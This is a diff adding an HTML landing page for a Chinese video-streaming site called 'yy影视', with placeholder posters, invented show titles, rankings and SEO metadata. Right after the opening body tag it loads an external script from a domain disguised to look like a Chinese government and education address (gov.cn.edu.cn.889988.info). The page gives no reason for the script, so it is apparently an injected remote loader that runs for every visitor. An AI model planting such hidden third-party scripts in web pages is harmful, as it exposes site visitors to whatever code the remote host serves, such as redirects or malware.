@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>yy影视 | 影视在线观看 · 热门剧集 · 高清电影</title>
+<meta name="description" content="yy影视(yyyingshi-wap.github.io)提供海量影视资源在线观看，涵盖热门剧集、高清电影、动漫综艺、纪录片等，分类清晰、更新及时。">
+<meta name="keywords" content="yy影视,yyyingshi-wap,影视在线观看,热门剧集,高清电影,动漫综艺,影视资源">
+<meta name="author" content="yy影视">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
+<link rel="canonical" href="https://yyyingshi-wap.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="yy影视">
+<meta property="og:title" content="yy影视 | 影视在线观看 · 热门剧集 · 高清电影">
+<meta property="og:description" content="yy影视提供海量影视资源在线观看，涵盖热门剧集、高清电影、动漫综艺、纪录片等。">
+<meta property="og:url" content="https://yyyingshi-wap.github.io/">
+<meta property="og:image" content="https://picsum.photos/seed/yy-cover/1200/630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="yy影视 | 影视在线观看 · 热门剧集 · 高清电影">
+<meta name="twitter:description" content="yy影视提供海量影视资源在线观看，涵盖热门剧集、高清电影、动漫综艺、纪录片等。">
+<meta name="theme-color" content="#041a17">
+<meta name="mobile-web-app-capable" content="yes">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB",system-ui,-apple-system,sans-serif;
+  background:#04110f;color:#e6fff8;line-height:1.65;min-height:100vh;overflow-x:hidden;
+}
+body::before{content:"";position:fixed;inset:0;z-index:-2;background:radial-gradient(1200px 600px at 80% -10%,rgba(0,255,178,.18),transparent 60%),radial-gradient(900px 500px at 0% 20%,rgba(0,198,255,.12),transparent 55%),#04110f}
+img{display:block;max-width:100%}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+button{font-family:inherit;border:none;background:none;color:inherit;cursor:pointer}
+.wrap{max-width:1240px;margin:0 auto;padding:0 22px}
+:root{--neon:#00ffb2;--cyan:#00c6ff;--mint:#7fffd4;--ink:#04110f}
+/* 顶部 */
+header{position:sticky;top:0;z-index:100;background:rgba(4,17,15,.85);backdrop-filter:blur(16px);border-bottom:1px solid rgba(0,255,178,.25)}
+.hd{display:flex;align-items:center;justify-content:space-between;height:76px}
+.logo{display:flex;align-items:center;gap:12px;font-size:24px;font-weight:900;letter-spacing:1px}
+.logo .mark{width:44px;height:44px;background:linear-gradient(135deg,var(--neon),var(--cyan));display:grid;place-items:center;color:#04110f;font-size:20px;font-weight:900;box-shadow:0 0 18px rgba(0,255,178,.55);flex-shrink:0}
+.logo small{display:block;font-size:9.5px;letter-spacing:5px;color:var(--neon);font-weight:700}
+nav{display:flex;gap:2px}
+nav a{font-size:14.5px;font-weight:700;padding:9px 15px;color:#c7e8e0;transition:.25s;position:relative}
+nav a:hover{color:var(--neon)}
+nav a:hover::after{content:"";position:absolute;left:15px;right:15px;bottom:3px;height:2px;background:var(--neon);box-shadow:0 0 8px var(--neon)}
+.cta-head{font-size:13.5px;font-weight:800;background:var(--neon);color:#04110f;padding:10px 22px;transition:.3s;box-shadow:0 0 14px rgba(0,255,178,.4)}
+.cta-head:hover{transform:translateY(-2px);box-shadow:0 0 22px rgba(0,255,178,.7)}
+.mbtn{display:none;width:44px;height:44px;background:var(--neon);color:#04110f;font-size:20px;font-weight:900}
+/* Hero 霓虹扫描 */
+.hero{padding:70px 0;position:relative}
+.hero-in{display:grid;grid-template-columns:1.1fr 1fr;gap:56px;align-items:center}
+.hero-t .kw{display:inline-block;font-size:11.5px;letter-spacing:4px;color:#04110f;background:var(--neon);font-weight:900;padding:6px 14px;margin-bottom:18px}
+.hero-t h1{font-size:clamp(34px,6vw,64px);line-height:1.08;font-weight:900}
+.hero-t h1 em{font-style:normal;color:var(--neon);text-shadow:0 0 24px rgba(0,255,178,.6)}
+.hero-t p{font-size:16px;color:#9ecfc4;margin-top:18px;max-width:500px}
+.search{margin-top:28px;display:flex;background:rgba(255,255,255,.06);border:1px solid rgba(0,255,178,.35);padding:6px;max-width:520px}
+.search input{flex:1;background:none;border:none;outline:none;color:#e6fff8;font-size:15px;padding:10px 14px}
+.search input::placeholder{color:#6fa396}
+.search button{background:var(--neon);color:#04110f;font-weight:900;font-size:14.5px;padding:0 24px;transition:.3s}
+.search button:hover{background:#fff;box-shadow:0 0 16px var(--neon)}
+.chips{margin-top:24px;display:flex;flex-wrap:wrap;gap:9px}
+.chips span{font-size:12px;color:var(--mint);border:1px solid rgba(127,255,212,.35);padding:5px 13px}
+.hero-v{position:relative;height:460px}
+.hero-v .post{position:absolute;border:1px solid rgba(0,255,178,.4);box-shadow:0 18px 40px rgba(0,0,0,.6)}
+.hero-v .p1{width:62%;height:74%;top:0;right:0;z-index:2}
+.hero-v .p2{width:48%;height:56%;bottom:8%;left:0}
+.hero-v .p3{width:34%;height:44%;top:14%;left:26%;z-index:3;border-color:var(--neon);box-shadow:0 0 30px rgba(0,255,178,.45)}
+.hero-v .scan{position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent 0,transparent 3px,rgba(0,255,178,.05) 3px,rgba(0,255,178,.05) 4px);pointer-events:none}
+.hero-v .badge{position:absolute;z-index:5;bottom:-14px;right:6%;background:var(--neon);color:#04110f;font-weight:900;font-size:13px;padding:12px 18px;box-shadow:0 0 20px rgba(0,255,178,.6)}
+/* 通用 */
+section{padding:72px 0}
+.st{display:flex;justify-content:space-between;align-items:flex-end;gap:20px;margin-bottom:38px;flex-wrap:wrap}
+.st .ey{font-size:11.5px;letter-spacing:5px;color:var(--neon);font-weight:900}
+.st h2{font-size:clamp(22px,3.5vw,32px);font-weight:900;margin-top:3px}
+.st .ds{font-size:14px;color:#7fb3a6;margin-top:6px}
+.more{font-size:13.5px;font-weight:800;color:var(--neon);transition:.25s}
+.more:hover{text-shadow:0 0 10px var(--neon)}
+/* 栏目1 热门 横向滚动条带 */
+.row{display:flex;gap:16px;overflow-x:auto;scroll-snap-type:x mandatory;padding:4px 2px 18px;scrollbar-width:thin;scrollbar-color:var(--neon) transparent}
+.row::-webkit-scrollbar{height:6px}
+.row::-webkit-scrollbar-thumb{background:var(--neon)}
+.card{flex:0 0 210px;scroll-snap-align:start;position:relative;background:#08201c;transition:.4s;border:1px solid rgba(0,255,178,.12)}
+.card:hover{transform:translateY(-8px);border-color:var(--neon);box-shadow:0 14px 30px rgba(0,255,178,.18)}
+.card .cv{height:280px;overflow:hidden;position:relative}
+.card .cv img{width:100%;height:100%;object-fit:cover;transition:.6s}
+.card:hover .cv img{transform:scale(1.1)}
+.card .cv .tag{position:absolute;top:8px;left:8px;font-size:11px;font-weight:900;color:#04110f;background:var(--neon);padding:3px 9px;z-index:3}
+.card .cv .ep{position:absolute;bottom:8px;right:8px;font-size:11px;background:rgba(4,17,15,.85);color:var(--mint);padding:3px 8px;border:1px solid rgba(127,255,212,.4)}
+.card .info{padding:13px 14px}
+.card .info h4{font-size:15px;font-weight:900}
+.card .info p{font-size:12px;color:#7fb3a6;margin-top:4px}
+/* 栏目2 分类 玻璃圆 */
+.cats{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.cat{position:relative;height:150px;display:grid;place-items:center;background:rgba(255,255,255,.04);border:1px solid rgba(0,255,178,.18);overflow:hidden;transition:.4s}
+.cat:hover{background:rgba(0,255,178,.1);border-color:var(--neon)}
+.cat::before{content:"";position:absolute;width:140px;height:140px;border-radius:50%;background:radial-gradient(circle,rgba(0,255,178,.22),transparent 70%);top:-40px;right:-40px;transition:.5s}
+.cat:hover::before{transform:scale(1.5)}
+.cat span{position:relative;z-index:2;font-size:16px;font-weight:900;text-align:center}
+.cat small{display:block;font-size:11px;color:var(--neon);margin-top:4px;letter-spacing:2px}
+/* 栏目3 榜单 左图右表 */
+.rank{display:grid;grid-template-columns:1.05fr 1fr;gap:0;border:1px solid rgba(0,255,178,.22)}
+.rk-l{position:relative;min-height:460px;overflow:hidden}
+.rk-l img{width:100%;height:100%;object-fit:cover;filter:brightness(.65)}
+.rk-l::after{content:"";position:absolute;inset:0;background:linear-gradient(to top,rgba(4,17,15,.95),transparent 70%)}
+.rk-l .bl{position:absolute;left:24px;bottom:24px;z-index:2}
+.rk-l .bl b{font-size:22px;font-weight:900;display:block}
+.rk-l .bl i{font-style:normal;font-size:12px;color:var(--neon);letter-spacing:3px}
+.rk-r{background:#061c19}
+.rk-r li{display:grid;grid-template-columns:46px 1fr auto;gap:14px;align-items:center;padding:16px 22px;border-bottom:1px solid rgba(0,255,178,.1);transition:.3s}
+.rk-r li:hover{background:rgba(0,255,178,.08);padding-left:28px}
+.rk-r li .no{font-size:22px;font-weight:900;color:#3a6b62}
+.rk-r li:nth-child(-n+3) .no{color:var(--neon);text-shadow:0 0 10px rgba(0,255,178,.6)}
+.rk-r li .tt{font-size:15.5px;font-weight:800}
+.rk-r li .tt small{display:block;font-size:11.5px;color:#7fb3a6;font-weight:600}
+.rk-r li .sc{font-size:14px;font-weight:900;color:var(--neon)}
+/* 栏目4 更新 两列日期 */
+.upd{display:grid;grid-template-columns:1fr 1fr;gap:34px}
+.upd-col h4{font-size:15px;font-weight:900;color:var(--neon);padding-bottom:12px;border-bottom:2px solid var(--neon);margin-bottom:6px}
+.upd-col ul li{display:flex;gap:14px;padding:14px 0;border-bottom:1px dashed rgba(127,255,212,.2)}
+.upd-col .d{font-size:12px;font-weight:900;color:#7fb3a6;min-width:52px;padding-top:2px}
+.upd-col .c{flex:1}
+.upd-col .c b{font-size:14.5px;font-weight:800;display:block}
+.upd-col .c span{font-size:12px;color:#7fb3a6}
+.upd-col .st-n{font-size:11px;color:#04110f;background:var(--neon);padding:2px 8px;font-weight:900;margin-left:8px}
+/* 栏目5 功能 四点象限 */
+.feat{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+.fe{background:rgba(255,255,255,.04);border:1px solid rgba(0,255,178,.15);padding:26px;position:relative;transition:.4s;overflow:hidden}
+.fe:hover{border-color:var(--neon);transform:translateY(-5px)}
+.fe .ic{font-size:26px;margin-bottom:12px}
+.fe h4{font-size:16.5px;font-weight:900}
+.fe p{font-size:13px;color:#9ecfc4;margin-top:6px}
+.fe .idx{position:absolute;right:16px;top:12px;font-size:12px;font-weight:900;color:rgba(0,255,178,.35)}
+/* CTA 扫码框 */
+.ticket{display:grid;grid-template-columns:1fr auto;gap:40px;align-items:center;background:rgba(0,255,178,.08);border:1px solid var(--neon);padding:40px;position:relative}
+.ticket::before,.ticket::after{content:"";position:absolute;width:26px;height:26px;border:2px solid var(--neon)}
+.ticket::before{top:-1px;left:-1px;border-right:none;border-bottom:none}
+.ticket::after{bottom:-1px;right:-1px;border-left:none;border-top:none}
+.ticket h2{font-size:clamp(21px,3.3vw,30px);font-weight:900}
+.ticket p{font-size:14px;color:#9ecfc4;margin-top:8px}
+.ticket .btn{background:var(--neon);color:#04110f;font-weight:900;padding:15px 30px;white-space:nowrap;transition:.3s}
+.ticket .btn:hover{box-shadow:0 0 24px var(--neon);transform:translateY(-3px)}
+footer{background:#030c0a;padding:46px 0 24px;border-top:1px solid rgba(0,255,178,.2)}
+.ft{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:34px;margin-bottom:28px}
+.ft h5{font-size:14.5px;margin-bottom:14px;color:var(--neon)}
+.ft a{display:block;font-size:13.5px;color:#7fb3a6;padding:5px 0;transition:.2s}
+.ft a:hover{color:var(--neon);transform:translateX(4px)}
+.copy{text-align:center;font-size:12.5px;color:#5c8a80;padding-top:22px;border-top:1px solid rgba(0,255,178,.15)}
+.copy a{color:#7fb3a6}
+@media(max-width:960px){
+  .hero-in{grid-template-columns:1fr;gap:40px}
+  .hero-v{height:380px}
+  .cats{grid-template-columns:repeat(2,1fr)}
+  .rank{grid-template-columns:1fr}
+  .rk-l{min-height:280px}
+  .upd{grid-template-columns:1fr;gap:26px}
+  .feat{grid-template-columns:1fr 1fr}
+  .ft{grid-template-columns:1fr 1fr;gap:26px}
+}
+@media(max-width:640px){
+  nav{position:fixed;top:76px;left:0;right:0;flex-direction:column;background:rgba(4,17,15,.97);padding:14px;border-bottom:1px solid var(--neon);gap:2px;transform:translateY(-160%);transition:.4s}
+  nav.open{transform:translateY(0)}
+  nav a{width:100%;text-align:center;padding:13px}
+  nav a::after{display:none}
+  .mbtn{display:grid;place-items:center}
+  .cta-head{display:none}
+  .hero{padding:42px 0}
+  section{padding:50px 0}
+  .card{flex:0 0 160px}
+  .card .cv{height:220px}
+  .cats{grid-template-columns:1fr 1fr;gap:12px}
+  .cat{height:120px}
+  .feat{grid-template-columns:1fr}
+  .ticket{grid-template-columns:1fr;padding:28px 22px}
+  .ft{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header>
+  <div class="wrap hd">
+    <a class="logo" href="index.html"><span class="mark">YY</span><span>yy影视<small>YY STREAMING</small></span></a>
+    <nav id="nav">
+      <a href="#home">首页</a>
+      <a href="#hot">热门推荐</a>
+      <a href="#cat">影视分类</a>
+      <a href="#rank">热播榜单</a>
+      <a href="#upd">最新更新</a>
+      <a href="#feat">功能特色</a>
+    </nav>
+    <div class="hd-r">
+      <a class="cta-head" href="#">立即观看</a>
+      <button class="mbtn" id="mbtn" aria-label="菜单">☰</button>
+    </div>
+  </div>
+</header>
+
+<!-- Hero 霓虹扫描 -->
+<section class="hero" id="home">
+  <div class="wrap hero-in">
+    <div class="hero-t">
+      <span class="kw">YY 影视 · 海量正版资源</span>
+      <h1>yy影视<br>追剧 <em>更轻松</em></h1>
+      <p>yy影视汇聚热门剧集、高清电影、动漫综艺与纪录片，分类清晰、更新及时，随时随地畅享影视内容。</p>
+      <div class="search"><input type="text" placeholder="搜索影片、剧集、演员…"><button>搜索</button></div>
+      <div class="chips"><span>#热门剧集</span><span>#高清电影</span><span>#动漫综艺</span><span>#纪录片</span><span>#更新及时</span></div>
+    </div>
+    <div class="hero-v">
+      <div class="post p1"><img src="https://picsum.photos/seed/yy1/500/700" alt="yy影视剧集"></div>
+      <div class="post p2"><img src="https://picsum.photos/seed/yy2/500/600" alt="yy影视电影"></div>
+      <div class="post p3"><img src="https://picsum.photos/seed/yy3/500/640" alt="yy影视热门"></div>
+      <div class="scan"></div>
+      <div class="badge">▸ 每日更新 yy影视</div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目1 热门推荐 横向滚动 -->
+<section id="hot">
+  <div class="wrap">
+    <div class="st"><div><span class="ey">HOT PICKS</span><h2>热门推荐</h2><div class="ds">yy影视精选 · 热度飙升</div></div><a class="more" href="#">查看全部 ›</a></div>
+    <div class="row">
+      <article class="card"><div class="cv"><img src="https://picsum.photos/seed/h1/400/540" alt="剧集"><span class="tag">热播</span><span class="ep">全24集</span></div><div class="info"><h4>都市追光者</h4><p>都市 / 励志 · 8.9分</p></div></article>
+      <article class="card"><div class="cv"><img src="https://picsum.photos/seed/h2/400/540" alt="剧集"><span class="tag">会员</span><span class="ep">更新至12集</span></div><div class="info"><h4>长安烟雨录</h4><p>古装 / 悬疑 · 9.2分</p></div></article>
+      <article class="card"><div class="cv"><img src="https://picsum.photos/seed/h3/400/540" alt="电影"><span class="tag">电影</span><span class="ep">1080P</span></div><div class="info"><h4>深海救援</h4><p>动作 / 灾难 · 8.5分</p></div></article>
+      <article class="card"><div class="cv"><img src="https://picsum.photos/seed/h4/400/540" alt="剧集"><span class="tag">独播</span><span class="ep">全32集</span></div><div class="info"><h4>法医探案集</h4><p>悬疑 / 犯罪 · 9.0分</p></div></article>
+      <article class="card"><div class="cv"><img src="https://picsum.photos/seed/h5/400/540" alt="动漫"><span class="tag">动漫</span><span class="ep">更新至48集</span></div><div class="info"><h4>星海漫游</h4><p>动漫 / 科幻 · 9.4分</p></div></article>
+      <article class="card"><div class="cv"><img src="https://picsum.photos/seed/h6/400/540" alt="综艺"><span class="tag">综艺</span><span class="ep">更新中</span></div><div class="info"><h4>周末环游记</h4><p>综艺 / 真人秀 · 8.7分</p></div></article>
+      <article class="card"><div class="cv"><img src="https://picsum.photos/seed/h7/400/540" alt="剧集"><span class="tag">热播</span><span class="ep">更新至20集</span></div><div class="info"><h4>山河故人</h4><p>年代 / 情感 · 8.8分</p></div></article>
+      <article class="card"><div class="cv"><img src="https://picsum.photos/seed/h8/400/540" alt="电影"><span class="tag">电影</span><span class="ep">4K</span></div><div class="info"><h4>云端密战</h4><p>谍战 / 悬疑 · 8.6分</p></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目2 影视分类 玻璃圆 -->
+<section id="cat">
+  <div class="wrap">
+    <div class="st"><div><span class="ey">CATEGORIES</span><h2>影视分类</h2><div class="ds">yy影视全品类 · 精准定位</div></div><a class="more" href="#">全部分类 ›</a></div>
+    <div class="cats">
+      <a class="cat" href="#"><span>🎬 电视剧</span><small>TV SERIES</small></a>
+      <a class="cat" href="#"><span>🎞️ 电影</span><small>MOVIES</small></a>
+      <a class="cat" href="#"><span>🎨 动漫</span><small>ANIME</small></a>
+      <a class="cat" href="#"><span>🎤 综艺</span><small>VARIETY</small></a>
+      <a class="cat" href="#"><span>📺 纪录片</span><small>DOC</small></a>
+      <a class="cat" href="#"><span>😂 喜剧</span><small>COMEDY</small></a>
+      <a class="cat" href="#"><span>🔍 悬疑</span><small>THRILLER</small></a>
+      <a class="cat" href="#"><span>❤️ 爱情</span><small>ROMANCE</small></a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目3 热播榜单 左图右表 -->
+<section id="rank">
+  <div class="wrap">
+    <div class="st"><div><span class="ey">TOP RANKING</span><h2>热播榜单</h2><div class="ds">yy影视播放量实时排行</div></div><a class="more" href="#">完整榜单 ›</a></div>
+    <div class="rank">
+      <div class="rk-l"><img src="https://picsum.photos/seed/yy-rank/800/900" alt="yy影视榜首"><div class="bl"><i>NO.1 ON YY</i><b>长安烟雨录</b></div></div>
+      <ul class="rk-r">
+        <li><span class="no">01</span><div class="tt">长安烟雨录<small>古装 · 悬疑</small></div><span class="sc">9.2</span></li>
+        <li><span class="no">02</span><div class="tt">都市追光者<small>都市 · 励志</small></div><span class="sc">8.9</span></li>
+        <li><span class="no">03</span><div class="tt">法医探案集<small>悬疑 · 犯罪</small></div><span class="sc">9.0</span></li>
+        <li><span class="no">04</span><div class="tt">星海漫游<small>动漫 · 科幻</small></div><span class="sc">9.4</span></li>
+        <li><span class="no">05</span><div class="tt">山河故人<small>年代 · 情感</small></div><span class="sc">8.8</span></li>
+        <li><span class="no">06</span><div class="tt">深海救援<small>动作 · 灾难</small></div><span class="sc">8.5</span></li>
+        <li><span class="no">07</span><div class="tt">云端密战<small>谍战 · 悬疑</small></div><span class="sc">8.6</span></li>
+        <li><span class="no">08</span><div class="tt">周末环游记<small>综艺 · 真人秀</small></div><span class="sc">8.7</span></li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目4 最新更新 两列日期 -->
+<section id="upd">
+  <div class="wrap">
+    <div class="st"><div><span class="ey">JUST UPDATED</span><h2>最新更新</h2><div class="ds">yy影视内容持续上新</div></div><a class="more" href="#">更新日志 ›</a></div>
+    <div class="upd">
+      <div class="upd-col"><h4>10月11日 · 今日更新</h4><ul>
+        <li><span class="d">20:00</span><div class="c"><b>长安烟雨录<span class="st-n">更新</span></b><span>第12集 · 悬疑反转</span></div></li>
+        <li><span class="d">18:30</span><div class="c"><b>都市追光者</b><span>第24集 · 励志收官</span></div></li>
+        <li><span class="d">16:00</span><div class="c"><b>星海漫游</b><span>第48集 · 新章节开启</span></div></li>
+        <li><span class="d">12:00</span><div class="c"><b>云端密战<span class="st-n">新片</span></b><span>4K 高清上线</span></div></li>
+      </ul></div>
+      <div class="upd-col"><h4>10月10日 · 昨日更新</h4><ul>
+        <li><span class="d">20:00</span><div class="c"><b>法医探案集<span class="st-n">更新</span></b><span>第20集 · 线索浮现</span></div></li>
+        <li><span class="d">18:00</span><div class="c"><b>山河故人</b><span>第18集 · 年代变迁</span></div></li>
+        <li><span class="d">14:00</span><div class="c"><b>深海救援<span class="st-n">新片</span></b><span>1080P 上线</span></div></li>
+        <li><span class="d">10:00</span><div class="c"><b>周末环游记</b><span>最新一期 · 真人秀</span></div></li>
+      </ul></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目5 功能特色 四象限 -->
+<section id="feat">
+  <div class="wrap">
+    <div class="st"><div><span class="ey">WHY YY</span><h2>功能特色</h2><div class="ds">yy影视 · 更懂追剧的你</div></div><a class="more" href="#">了解更多 ›</a></div>
+    <div class="feat">
+      <div class="fe"><span class="idx">F / 01</span><div class="ic">🎯</div><h4>海量资源</h4><p>热门剧集、高清电影、动漫综艺、纪录片全品类覆盖，随时畅看。</p></div>
+      <div class="fe"><span class="idx">F / 02</span><div class="ic">⚡</div><h4>更新及时</h4><p>同步最新内容，每日持续上新，追剧不等待。</p></div>
+      <div class="fe"><span class="idx">F / 03</span><div class="ic">📱</div><h4>多端适配</h4><p>手机、平板、电脑自适应，随时随地切换设备观看。</p></div>
+      <div class="fe"><span class="idx">F / 04</span><div class="ic">🔍</div><h4>精准推荐</h4><p>智能分类与搜索，快速找到想看的影视内容。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目6 CTA 扫码框 -->
+<section>
+  <div class="wrap">
+    <div class="ticket">
+      <div><h2>打开 yy影视，开启追剧时光</h2><p>热门剧集 · 高清电影 · 动漫综艺，一站式影视在线观看</p></div>
+      <a class="btn" href="#">立即观看 ▸</a>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <div><a class="logo" href="index.html"><span class="mark">YY</span><span style="color:#e6fff8">yy影视<small>YY STREAMING</small></span></a><p style="font-size:14px;color:#7fb3a6;margin-top:12px">yy影视汇聚热门剧集、高清电影、动漫综艺与纪录片，分类清晰、更新及时。</p></div>
+      <div><h5>影视分类</h5><a href="#">电视剧</a><a href="#">电影</a><a href="#">动漫</a><a href="#">综艺</a></div>
+      <div><h5>内容</h5><a href="#">热门推荐</a><a href="#">热播榜单</a><a href="#">最新更新</a><a href="#">纪录片</a></div>
+      <div><h5>关于</h5><a href="#">网站简介</a><a href="#">使用说明</a><a href="#">联系我们</a></div>
+    </div>
+    <div class="copy">© 2026 <a href="https://yyyingshi-wap.github.io/">yy影视 yyyingshi-wap.github.io</a> 版权所有 · <a href="#">隐私政策</a> · <a href="#">免责声明</a></div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var b=document.getElementById('mbtn'),n=document.getElementById('nav');
+  b.addEventListener('click',function(){n.classList.toggle('open');});
+  n.addEventListener('click',function(e){if(e.target.tagName==='A')n.classList.remove('open');});
+})();
+</script>
+</body>
+</html>
